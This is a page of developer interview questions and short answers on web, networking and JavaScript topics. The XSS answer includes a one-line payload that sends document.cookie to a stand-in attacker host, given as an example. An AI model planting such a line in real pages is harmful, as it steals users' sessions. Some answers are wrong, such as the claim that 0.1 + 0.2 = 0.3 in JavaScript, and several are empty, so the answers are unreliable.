---
layout: article
title: Internet and machine related questions
interview: true
---
# {{ page.title }}


### How does threads and stacks work

The stack is attached to a thread, so when the thread exits the stack is reclaimed.

The size of the stack is set when a thread is created. The size of the heap is set on application startup, but can grow as space is needed.

### What is MX record

MX record is a type of resource record in the Domain Name System that specifies the mail server responsible for receiving emails. How it works is when an E-mail is sent through the Internet, the sending mail transfer agent queries the domain for it's MX for a list of mail servers able to handle the emailing sending before establishing an SMTP connection.

### What tools do you use to generate API documentations

We tried apidoc.js before and later we switched RAML and osprey for API specification. The good thing about RAML is you're forced to define your API specification before you're able to develop and use the API endpoints. You can also make RAML work on type checking and error handling for you. Since the schema is clearly defined you can use some other tools to generate the api docs very easily.

### What is Object-relational mapping

Object Relational Mapping (ORM) refers to the mapping of persisted data, traditionally stored in an RDBMS, to objects used by the application. This makes working with the data more easy and secure to the language that the application is written in.

### Why say that HTTP is a stateless protocol?

HTTP is a stateless protocol, in other word the server will forget everything related to client/browser state.

### What is REST

REST (REpresentational State Transfer) is an architectural style, and an approach to communications that is often used in the development of Web services.

The REST style emphasizes that interactions between clients and services is enhanced by having a limited number of operations (verbs).

assigning resources (nouns) their own unique Universal Resource Identifiers (URIs).

### What is CORS?

Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the first resource was served.

![](https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Flowchart_showing_Simple_and_Preflight_XHR.svg/1024px-Flowchart_showing_Simple_and_Preflight_XHR.svg.png)

### What is CSRF

Cross-Site Request Forgery (CSRF) is a form of website security vulnerability that an attacker is able to execute some actions on a web application on hehalf of the user in which they're currently authenticated.

### What is a Pre-flight request?

If a request may have implications on user data, a simple request is insufficient. Instead, a preflight CORS request is sent in advance of the actual request to ensure that the actual request is safe to send. Also, if the request contains any custom headers, then a preflight request is required.

### How do you deal with dates and localization in apps?

### How can you listen on port 80 with Node?

You should not unless you're dealing with maybe Docker applications.

Still, if you want to have your Node.js application listen on port 80, here is what you can do. Run the application on any port above 1024, then put a reverse proxy like nginx in front of it. Also if you still want to use it at port 80 directly you would have to run the process with a root permission.

### How can JS Engine know if it is an async function so that it can put it in the Event Loop?

There is a fixed set of functions in node.js that are are known to be async  because they have to call the OS or C++.

### The time required to run this code in Google Chrome is considerably more than the time required to run it in Node.js. Explain why this is so, even though both use the v8 JavaScript Engine.

Because when you declare a variable outside of a function scope the variable would become global. In node.js it will be global under the module's scope. However, in the browser environment the global scope would become an added property to the window object.

### What is the difference between a process and a thread?

A process is an independent entity in which system resources like CPU time or memory are allocated. Each process is executed in a separate address space, and one process cannot access the variables in another process.

A thread exists within a process and shares the process' resource. A process can have multiple threads running the tasks at the same time. And the threads would have access to the process' variables.

### How does Node.js handle child threads?

### Calculate the time in a Javascript process

console.time("loop");
console.timeEnd("loop");

### What is Programming paradigms

Programming paradigm is a way to classify programming languages based on the features of the language.

### What is functional programming

functional programming is a programming paradigm that treats computation as the evaluation of a function and avoids changing-state and mutable-data. Which is saying that the output of a function is always the same for the same given inputs and therefore it's easier to predict the output and prevent the side effects when you're doing functional programming.

### What is a side effect

A function or expression is said to have a side effect if it modifies the state outside its scope.

### What is meant by first class object:

In computer science, a programming language is said to support first-class functions (or function literal) if it treats functions as first-class objects. Specifically, this means that the language supports constructing new functions during the execution of a program, storing them in data structures, passing them as arguments to other functions, and returning them as the values of other functions.

### What is a monad

Monad is a design pattern used to describe computations as a series of functions.

### What is a factory

a factory is an object for creating other objects.

### Drawbacks of Factories

Doesn’t create a link from the instance to `Factory.prototype` — but this is actually a good thing because you won’t get a deceptive `instanceof`. Instead, `instanceof` will always fail. See benefits.
`this` doesn’t refer to the new object inside the factory. See benefits.
It may perform slower than a constructor function in micro-optimization benchmarks. Be sure to test in the context of your app if this is a concern for you.

### Pros and cons of Javascript

pros:
You can pass functions as arguments into other functions as callbacks
It’s async, non-blocking. It has npm. It has a thriving community and a lot of support and use cases on Stackoverflow.com.

cons:
It does not support decimals: 0.1 + 0.2 = 0.3. It does not have strict typing. Array is not always like what it seems. It's coding syntax is too relaxed sometimes, so you'd likely to bump into pitfalls sometimes.

### JavaScript follows which Programming Paradigm?

It is a mixture of object oriented programming and functional programing.

### What are the pros and cons of monolithic vs microservice architectures?
monolithic
When everything is running through the same app, it’s easy to hook up components to those cross-cutting concerns.
There can also be performance advantages, since shared-memory access is faster than inter-process communication (IPC).
microservice
They can also have performance advantages depending on how they’re organized because it’s possible to isolate hot services and scale them independent of the rest of the app.

### What are two-way data binding and one-way data flow, and how are they different?

Two way data binding means that UI fields are bound to model data dynamically such that when a UI field changes, the model data changes with it and vice-versa.

One way data flow means that the model is the single source of truth

### HttpOnly cookie

Cookies are usually created by a server, passed to the browser and then passed back. Now it is possible to create and manipulate Cookies using JavaScript which can be helpful but can also be a security hole. So an HttpOnly Cookie is only accessible by the server, or in other words it is not accessible from client side JavaScript which protects your site from some forms of XSS attacks. So the Browser will store and return an HttpOnly Cookie but it will not alter it or allow you to create it on the client; an HttpOnly Cookie must be created on the server.

### What is XSS attack

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

Steal information

```
document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />')
```

Some browsers have implemented attempts at mitigating XSS and CSRF holes in websites, but these are heuristics looking for typical patterns of attacks. They are in no way complete.

[OWASP XSS Prevention Cheat Sheet Tasks](http://www.insecurelabs.org/task/)

### How do you check if an object is an array or not

Array.isArray(arrayList);

### What is duck typing

In computer programming, duck typing is an application of the duck test in type safety. It requires that type checking be deferred to runtime, and is implemented by means of dynamic typing or reflection.

### Why not LocalStorage

- it's blocking, that is, it is synchronous

### known_hosts & authorized_keys

The known_hosts file lets the client authenticate the server, to check that it isn't connecting to an impersonator. The authorized_keys file lets the server authenticate the user.

### How does ssh work

The more well-discussed use of asymmetrical encryption with SSH comes from SSH key-based authentication. SSH key pairs can be used to authenticate a client to a server. The client creates a key pair and then uploads the public key to any remote server it wishes to access. This is placed in a file called authorized_keys within the ~/.ssh directory in the user account's home directory on the remote server.

After the symmetrical encryption is established to secure communications between the server and client, the client must authenticate to be allowed access. The server can use the public key in this file to encrypt a challenge message to the client. If the client can prove that it was able to decrypt this message, it has demonstrated that it owns the associated private key. The server then can set up the environment for the client.

### What is integration test

### What is the difference between authentication and authorization

Authentication is the process of verifying who you are. Authorization is the process of verifying that you have access to something.

### What UI, Security, Performance, SEO, Maintainability or Technology considerations do you make while building a web application or site?

UI: SPA, the css libraries should be as small as possible
security: XSS, CSRF, sql injection, type checking and input validations, ddos, https

### Talk about your preferred development environment.

I prefer to work on a mac, use gmail to send and receive emails. I code using Sublime Text as well as using vim on a command line.

### Which version control systems are you familiar with?

git

### Explain OAuth to me

OAuth allows an end user's account information to be used by third-party services, such as Facebook, without exposing the user's password. OAuth acts as an intermediary on behalf of the end user, providing the service with an access token that authorizes specific account information to be shared. The process for obtaining the token is called a flow.


